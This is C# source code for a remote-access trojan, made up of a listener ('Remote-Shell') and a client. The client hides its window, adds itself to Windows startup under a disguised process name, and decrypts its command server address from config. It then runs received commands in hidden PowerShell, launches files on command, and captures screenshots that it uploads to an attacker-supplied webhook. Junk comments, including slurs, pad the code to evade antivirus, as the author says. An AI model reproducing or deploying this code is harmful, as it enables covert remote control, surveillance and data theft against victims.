IPAddress address = IPAddress.Parse(Lhost);
			IPEndPoint localEP = new IPEndPoint(address, Port);
			TcpListener tcpListener = new TcpListener(localEP);
			int num = 0;
			TcpClient tcpClient = null;
			tcpListener.Start();
			WriteColor(ConsoleColor.White, "\n\n [");
			WriteColor(ConsoleColor.Blue, "*");
			WriteColor(ConsoleColor.White, "] Waiting for a Connection from ");
			WriteColor(ConsoleColor.Blue, Rhost + "\n");
			tcpClient = tcpListener.AcceptTcpClient();
			while (((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString() != Rhost)
			{
				string rip = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
				int rp = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Port;
				tcpListener.Stop();
				tcpClient.GetStream().Close();
				tcpClient.Close();
				tcpListener.Start();
				tcpClient = tcpListener.AcceptTcpClient();
			}
			WriteColor(ConsoleColor.White, " [");
			WriteColor(ConsoleColor.Blue, "*");
			WriteColor(ConsoleColor.White, "]");
			WriteColor(ConsoleColor.White, " Connection from ");
			WriteColor(ConsoleColor.Blue, Rhost);
			WriteColor(ConsoleColor.White, " got Accepted...\n\n\n");

			WriteColor(ConsoleColor.White, " [");
			WriteColor(ConsoleColor.Blue, "*");
			WriteColor(ConsoleColor.White, "] ");
			WriteColor(ConsoleColor.White, "Remote-Shell is now running on Port ");
			WriteColor(ConsoleColor.Cyan, Port + "\n");
			Console.ForegroundColor = ConsoleColor.White;
			num = 0;
			int num321 = 0;
			bool isError = false;
			while (true)
			{
				try
				{
					num++;
					NetworkStream stream = tcpClient.GetStream();
					byte[] array = new byte[104857600];
					int num2 = stream.Read(array, 0, Math.Min(array.Length, tcpClient.ReceiveBufferSize));
					string RecivedData = Encoding.ASCII.GetString(array);
					if (array.Length > 65500)
					{
						array = new byte[104857600];
					}
					if (isError)
					{
						array = new byte[104857600];
						RecivedData = "ErrorTryAgain$$$$$$$$$$$$$";
						if (num321 + 2 == num)
						{
							isError = false;
						}
					}
					RecivedData = RecivedData.Substring(0, RecivedData.IndexOf("$"));
					string s = string.Empty;

					if (num == 1)
					{
						WriteColor(ConsoleColor.White, " [");
						WriteColor(ConsoleColor.Blue, "*");
						WriteColor(ConsoleColor.White, "] Remote Shell Connected (try '");
						WriteColor(ConsoleColor.Cyan, "whoami");
						WriteColor(ConsoleColor.White, "')\n");
					}

					if (num != 1)
					{
						Console.Write(RecivedData + "\n");
					}

					Console.Write($"./Remote-Shell(You --> {Rhost}:{Port})-$ ");
					s = Console.ReadLine();
					if (s == null || s == "")
					{
						s = "d";
					}

					RecivedData = "";
					byte[] bytes = Encoding.ASCII.GetBytes(s);
					stream.Write(bytes, 0, bytes.Length);
					stream.Flush();
				}
				catch (Exception ex)
				{
					num321 = num;
					isError = true;
					Console.WriteLine(ex.ToString());
					Console.Write("Do You want to Exit? [Y/N]: ");
					string Yesorno = Console.ReadLine();
					if (Yesorno.ToLower() == "y" || Yesorno.ToLower() == "yes")
					{
						Console.Write("Are You sure? [Y/N]: ");
						string Yesorno2 = Console.ReadLine();
						if (Yesorno2.ToLower() == "y" || Yesorno2.ToLower() == "yes")
						{
							break;
						}
					}
				}
			}







































++++++++++++++++++++++++++++++++++++++++++++++++CLIENT++++++++++++++++++++++++++++++++++++++++++++


private static string send(string msg)
        // BLPWDLASPOKDOA0909029301320193013901293012321
        {
            // DOOOOOOOOOOOOOOOOOOOOOOOOOSDOOOOI
            string rply = string.Empty;
            // dDOS = gAY
            NetworkStream stream = clientSocket.GetStream();
            // neTWORKsTReAm
            byte[] bytes = Encoding.ASCII.GetBytes(msg + "$");
            // PIPI PUPU KAKA
            stream.Write(bytes, 0, bytes.Length);
            // KDKOKO209310381283219389012321321321
            stream.Flush();
            // CODE--3219318392188888888888883333
            StringBuilder stringBuilder = new StringBuilder();
            // DDDDDDDDDDDDDDDDDDDSAOO23I219301930132131
            int num = 0;
            // 39FDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDAAAAAAAAAAAAAAAAAAADDDDDDDDDDDDDDAAAAAAAAAAA
            do
            // ---Abc--==LDSP;AA
            {
                // DKOASKKDDDDDDDDDDDDD-----------------
                try
                // i rEALLY h0PE bYPASSING aNTI-vIRUS wORKS..............................................................................................................
                // ...................................
                // ...................................
                // ...................................
                // ...................................
                // ...................................
                // ...................................
                {
                    // .__    _______         .________.__ 
                    // |  |__ \   _  \ ______ |   ____/|__|
                    // |  |  \/  /_\  \\____ \|____  \ |  |
                    // |   Y  \  \_/   \  |_> >       \|  |
                    // |___|  /\_____  /   __/______  /|__|
                    //      \/       \/|__|         \/     
                    byte[] array = new byte[104857600];
                    // scREEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN
                    num = stream.Read(array, 0, array.Length);
                    // DEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEP
                    string reply = Encoding.ASCII.GetString(array);
                    // eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
                    rply = reply;
                    // aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                    stringBuilder.AppendFormat("{0}", Encoding.ASCII.GetString(array, 0, num));
                    // bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
                }
                // DKOSKAODKSAOPDKAOPSKIDOPASKDAPSODKASOPDKASPODKASPODKAS
                catch (Exception ex)
                // DKLASODKAOPDK0AK290-381938219831920839128390123809123819381
                {
                    // DKSOIAK293K2901391283912839018390128391830921839128390128309
                    if (ex.Message.Contains("Unable to read data from the transport connection: An established connection was aborted by the software in your host machine."))
                    // SODAK23I219382190831892809G9FDJIJDIOJAOIDJAIODJAIOSJAOIDJAIODJA99999999999999999999999999
                    {
                        // SOAK-0000000000000000000000000000000000000000000000000000
                        return "E:00xFFAQQ4141";
                        // S.M.D
                    }
                    // BL
                    Console.WriteLine(ex.Message);
                    // #2022
                }
                // #LOVEYOUBRO
            }
            // ISHOWSPEED
            while (stream.DataAvailable);
            //EXECUREEEEEEEEEEEEEEEEEEEE
            Console.WriteLine(stringBuilder.Replace("\0", " "));
            // FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
            return rply;
            // R.I.P.000000000000000000000000000000000
        }
        // DEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEOOOOOP
        private static string Shell(string Command)
        // aLMOST dONE
        {
            // 239103123821938193821938129038129389218391839021
            try
            // 382918392183985T5JKFJDIKJSAOIDJASOIDJSAOIDJASDASDDDDDDDDDD-S=-321-3=21-312-=3-1=312
            {
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW
                Process process = new Process();
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWWDDDDDDDDD
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWWAAAAAAAA
                process.StartInfo.FileName = "powershell.exe";
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWWVVVVVVVVVVVVVVVBBBBBBBBBBB
                process.StartInfo.Arguments = "/C " + Command;
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWWCCCCCCCCCCCCC
                process.StartInfo.UseShellExecute = false;
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWWDDDDDDDDDDDDDDDDDD
                process.StartInfo.CreateNoWindow = true;
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWWEEEEEEEEEEEEEEEEEEEE
                process.StartInfo.RedirectStandardOutput = true;
                // //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW
                process.StartInfo.RedirectStandardInput = true;
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW
                process.Start();
                // //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW333333333333333333
                string text = "";
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW 111111111111111111
                while (!process.HasExited)
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW222222222222222222222
                {
                    //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW4444444444444444444
                    text += process.StandardOutput.ReadToEnd();
                    //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW555555555555555555555555555555555
                }
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW666666666666666666666666
                if (text != "")
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW777777777777777777777777
                {
                    //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW888888888888888888
                    return text;
                    //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW9999999999999999999999
                }
                // //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW454444444444444444
                return "null";
                //D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW//D SDAJIWWWWWWWWWWWWWWWWWWWWWWWWWWW
            }
            //D SD32103921039103 12JMIDSIAKDAD-SADSADAS-DSA-D-ASD-AS
            catch (Exception ex)
            //D SD32103921039103 12JMIDSIAKDAD-SADSADAS-DSA-D-ASD-AS//D SD32103921039103 12JMIDSIAKDAD-SADSADAS-DSA-D-ASD-AS
            {
                //D SD32103921039103 12JMIDSIAKDAD-SADSADAS-DSA-D-ASD-AS32222222222222222222
                return ex.Message;
                // DASKDOAKDOPASDADA
            }
            // i mADE iT...
        }




private static TcpClient clientSocket = new TcpClient();
        private async void main(object sender, RoutedEventArgs e)
        {
            // KSDOAGJAJWIGNGGGGGGGGGGAPSKDOADOMFGAKGAKSPDWOPAKDPOSAKDWADA
            this.Hide();
            // SKDOGKAKSODKOPWKAKAPOSKDLMGFAOKDPHPAPLSPKGOKOIAIDJGOKOSDAPDJDSAIJDISAJDPOSAD
            AddStartup("Windows_Processes_Easy_001001001", System.Reflection.Assembly.GetExecutingAssembly().Location);
            // SDKOSADSGDWQJIDJPOSJAOLDKKFA0IWJDKJSPOAKLPWJDISPIAJWPODSDDDDDDDDDDDDASDWASD2
            int P6134 = Convert.ToInt32(ConfigurationManager.AppSettings["__AK482NF091__"]);
            // SDKOSADSGDWQJIDJPOSJAOLDKKFA0IWJDKJSPOAKLPWJDISPIAJWPODSDDDDDDDDDDDDASDWASD1
            string __D52JF910KGJ__ = ConfigurationManager.AppSettings["__G19F0TKA55__"];
            // SDKOSADSGDWQJIDJPOSJAOLDKKFA0IWJDKJSPOAKLPWJDISPIAJWPODSDDDDDDDDDDDDASDWASD3
            string __DAKA232FA43__ = AES.Decrypt(__D52JF910KGJ__, "YOUAREAMOTHERFUCKER");
            // SDKOSADSGDWQJIDJPOSJAOLDKKFA0IWJDKJSPOAKLPWJDISPI321321111111111131AJWPODSDDDDDDDDDDDDASDWASD
            var __FA231DSA4UQ__ = Dns.GetHostEntry(__DAKA232FA43__).AddressList.First(addr => addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
            // SDKOSADSGDWQJIDJPOSJAOLDKKFA0IWJDKJSPOAKLPWJDISPIAJWPODSDDDDDDDDDDDDASDWASD22222222222222222222222222222222222
            string __F42GJK932DA__ = __FA231DSA4UQ__.MapToIPv4().ToString();
            // SDKOSADSGDWQJIDJPOSJAOLDKKFA0IWJDKJSPOAKLPWJDISPIAJWPODSDDDDDDDDDDDDASDWASD2222134151U92NDSANDAKSNDKSANKKKKKKKKKKKKKKKKKKK
            bool isconnected = false;
            // SDKOSADSGDWQJIDJPOSJAOLDKKFA0IWJDKJSPOAKLPWJDISPIAJWPODSDDDDDDDDDDDDASDWASDD// SDKOSADSGDWQJIDJPOSJAOLDKKFA0IWJDKJSPOAKLPWJDISPIAJWPODSDDDDDDDDDDDDASDWASD
            while (!isconnected)
            // SDKOSADSGDDDDDDDDDDDD
            {
                // SDKOSADSG1231231
                try
                // SDKOSADSGDDDDDDDDDDDDDDDD
                {
                    // SDKOSADSGDDDDDDDDDDDDDD// SDKOSADSG
                    clientSocket.Connect(__F42GJK932DA__, P6134);
                    // SDKOSADSGSDDDDDDDDDAOKDOKKKKSLAKDWLKDLSLDDDDDDDDDDDDDDDDD
                    await Task.Delay(10000);
                    // SDKOSADSGFFFFFFFFFFFFFFFFFFPASKDOQW
                    isconnected = clientSocket.Connected;
                    // SDKOSADSGDLPLPPPPPPPPPPPPPPPPPPPP
                }
                // SDKOSADSGVVVVeXECUTEFILE
                catch
                // SDKOSADSGrANDOM
                {
                    // SDKOSADSGfuck
                    await Task.Delay(10000);
                    // SDKOSADSGyOU
                }
                // SDKOSADSGMF
            }
            // SDKOSADSG// SDKOSADSG// SDKOSADSG
            string ServerReply = string.Empty;
            // SDKOSADSGDDDDDDDDDDDDDDDDDDDDDDDDDDD
            string ClientReply = string.Empty;
            // SDKOSADSGPDLAPSKDOPAKPOSDKSPOADKPOASKDPOAKDPOASKDOPAKD
            try
            // SDKOSADSGD;[[ASLLLLLLLLLLLLLLDADADDDDDDDDDDDDDDDDDDDDDDDDDDD
            {
                // SDKOSADSGDexcECUTE
                ServerReply = send("./$%OPCADMIN%$/.A.B.C.D.E.F.0.1.2.3.4.5.6.7.8.9");
                // SDKOSADSGDFLPAmACLICIOUS
                if (ServerReply == "E:00xFFAQQ4141")
                // SDKOSADSGyOURwELCOME,iFyOUrEADtHIS
                {
                    // // SDKOSADSGLETSGOOOO
                    await Task.Delay(10000);
                    // SDKOSADSG// SDKOSADSG// SDKOSADSG// SDKOSADSG
                    System.Windows.Forms.Application.Restart();
                    // SDKOSADSG222222
                    var prc = Process.GetCurrentProcess();
                    // SDKOSADSG1
                    prc.Kill();
                    // SDKOSADSG2
                }
                // SDKOSADSG3102I9EWOQDSADAS
            }
            // SDKOSADSG23L120LDPSAPSDDDDDDDDDDDDDDDDDDDDDDDDDDD
            catch
            // LDPSAP// LDPSAP// LDPSAP
            {
                // LDPSAPhELLOwORLD
                clientSocket.Close();
                // LDPSAPlapd
                var prc = Process.GetCurrentProcess();
                // LDPSAPSUBSCRIBETOhopsi
                prc.Kill();
                // opADMINCMDfuck
            }
            // aNtIvIrusfuCK
            while (true)
            // SADSG23L120LDPDDDDDDDDDDDDDDD
            {
                // DD22XXSADSG23L120LDP
                ServerReply = ServerReply.Replace("\0", string.Empty);
                // D[][][][][][][][][][
                if (!ServerReply.ToLower().StartsWith("opf") && ServerReply.ToLower().Trim() != "exi" && !ServerReply.ToLower().Trim().StartsWith("cap"))
                // SADSG23L120LDP #BLM
                {
                    // SADSG23L120LDDDDD #YOUARECOOL
                    ClientReply = Shell(ServerReply);
                    // SADSG23L120LDP # mADE bY h0PSI
                    if (ClientReply.Length > 65500)
                    // SADSG23L120LDP wHY aRE yOU rEADING tHE sOURCE?
                    {
                        // SADSG23L120LDPSADSG23L120LDPSADSG23L120LDP
                        ClientReply = "Error, To large output 65500 < " + ClientReply.Length;
                        // SADSG23L120LDP sTILL rEADING????????
                    }
                    // SADSG23L120LDP bRO sTOP
                }
                // SADSG23L120LDP #tIKtOK-gAY
                else if (ServerReply.ToLower().Trim() == "exi")
                // SADSG23L120LDP wANT mE TO eXPLAIN tHE cODE?
                {
                    // SADSG23L120LDP hERE wE arE rESTARTING tHE tROJAN1
                    clientSocket.Close();
                    // SADSG23L120LDP hERE wE arE rESTARTING tHE tROJAN2
                    System.Windows.Forms.Application.Restart();
                    // SADSG23L120LDP lOOOOOOOOOOOOOOOOOl
                }
                // bRO aRE yOU rEADING tHIS cOMMENTS??????
                else if (ServerReply.ToLower().StartsWith("opf"))
                // iGNORE tHESE mESSAGES, wHILE rEVERSE eNGENEERING tHIS cODE
                {
                    // aDD mE oN dC ABC#8366
                    try
                    // d0 y0U sPEAK dENGLISCH????
                    {
                        // i0000000000 LOLLLLLLLLLLLLLL
                        Process.Start(ServerReply.Substring(4, ServerReply.Length - 4));
                        // iF yOU wODNDER, iM tRYING TO bYPASS sOME aNTI-vIRUSES
                        ClientReply = "Success.";
                        // DOSPAKDOOOOOOOOOOOOOOOOOOOOOOODDDDDDDDDDDDDDDD
                    }
                    // SDPADSAKDSOSAKDOASKDOPSAKDOSAKDOPAKSDPKASDPOAKD
                    catch
                    // iM dONE tALIKIN', iM jUST gONNA wRITE sOME nONSENSE
                    {
                        // 3O1203210I3021930213902139210391203123
                        ClientReply = "Error.";
                        // 2319839128391283912389128391839218391238
                    }
                    // 32091301838593289083492869038948329483290482094
                }
                // 231758327871293721893791837912738921739821731273981
                else if (ServerReply.ToLower().StartsWith("cap"))
                // 2389183092183091398127398718937123897139871283712893721
                {   
                    // 2318391283912839218301283901283091283902183                    
                    string pth = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\" + $"w00xQ-{DateTime.Now.ToString("dd-HH-mm-ss-fff")}";
                    // 3218391839128908604938950389483294832048329482343244444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
                    Bitmap bmp = new Bitmap(Convert.ToInt32(Math.Round(SystemParameters.VirtualScreenWidth)), Convert.ToInt32(Math.Round(SystemParameters.VirtualScreenHeight)));
                    // 32183918391289086049389503894832948320483294823432444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444443222222222
                    Graphics gr = Graphics.FromImage(bmp);
                    // DSAODK023K1E092K19FJ912J09EJ19D2J0192JD021JD091JD901J2D091
                    gr.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    // 2K19KE912KE0921KE0912KE9012KE12KE091KE0912KE0912KE0912KE901EK0912
                    bmp.Save(pth, System.Drawing.Imaging.ImageFormat.Png);
                    // 29DK91KJ29K19KG90K91K290GJ91J90GFJ90J1290JF901JF901JF091JF91JF91JF19JFJFJJJJJJK
                    string webhook = ServerReply.Substring(4, ServerReply.Length - 4);
                    // HELLO 0KSDAOKDOPASKDPOSAKDOPASKDOSAKDPOWAKPODSKAPODKAPODKWPOKDOSKAOPW
                    using (HttpClient httpClient = new HttpClient())
                    // OSKDOAK2O3913K190MIODFAMSIMKLWM1PO29091J90DJSKMLKDAMDLKASMDLKASDA
                    {
                        // KSODKAOKDWK93J1903J2918JJJJJJJJJJJJ3I1MKDNSJANDUIWNAIDNSIOANOIWNDDDDDDDDDDDDDD
                        MultipartFormDataContent form = new MultipartFormDataContent();
                        // DADJSAIDOJJJJJJJJJJJJJJJJJJJSADSADSADADSADADASDA
                        var file_bytes = System.IO.File.ReadAllBytes(pth);
                        // DSKAODKWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOODKASKDOPAKDOAKDPOAKSDOSAKDOASKDPA
                        form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "file.png");
                        // LDAPOWPKDOKW193U21U31FJIJSDIOAJDJSAKOJDOIJISAJDIOSJAIODJSAODJASOIDJA90999999999999999999
                        httpClient.PostAsync(webhook, form).Wait();
                        // HELP-DSOADJKSOADKOPD- sTEAM-cODE: DPHAJ-PPOQG-LPDOA-GDVFJ
                        httpClient.Dispose();
                        // DSKAOKDOAKDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                    }
                    // KDOOOOOAOKSODKAPOKWPODKSPOKAPOWKDOPKSOPAKDDDDDDDDDDDDDDDDDDDDDDD
                }
                // LOSKAOP LMFAO ~ chinese hacker
                try
                // i DMMMMMMMMMMMMMMMMMMMMMMMM
                {
                    // KSOAKDDDDDDDDDDDDDDDDDOSAKKKKKKKKKKKOSDKAODKAO
                    ServerReply = send(ClientReply);
                    // SDLAPDLAPKWOPDKOPSAKPWKDOKSAPOKWPODKSPOOOOOOOOOOOOOOOO
                    if (ServerReply == "E:00xFFAQQ4141")
                    // iM a fANCY bITCH
                    {
                        // ----------------------------------------------
                        await Task.Delay(10000);
                        // I983291830921839021830918309218390128312983912789
                        System.Windows.Forms.Application.Restart();
                        // 32879074693859438593485093485903485903485903
                        var prc = Process.GetCurrentProcess();
                        // 439204832948239483290483290482390482309483209482309483209
                        prc.Kill();
                        // 329137573428742748932742374823748923749823478247328472389472
                    }
                    // 28391389128390128309183912839012839012839839012389038129038219381
                }
                // 893218392819381209389021830921830218 309218309128309128392183902109321
                catch
                // 291839128309812382888888888888888888888888888821903829108301232132131
                {
                    // 238193088888888888192803183-069423093012480932849328490283492842
                    clientSocket.Close();
                    // 3239183918290 382109381290381209382190 821093 821093 821093 8210 3821
                    var prc = Process.GetCurrentProcess();
                    // 2313 2183 92183 092183 921 83021 83091 830213 82091 83129 380192 3812093 812093 81
                    prc.Kill();
                    // 32193891583298 45932849328493284903 284928498294 82948 2948 392 48329 849023
                }
                // 8928319830213821222222222222222
            }
            // 29381983913829108568902MCKSDMAKDMSAODMAIMWD
        }
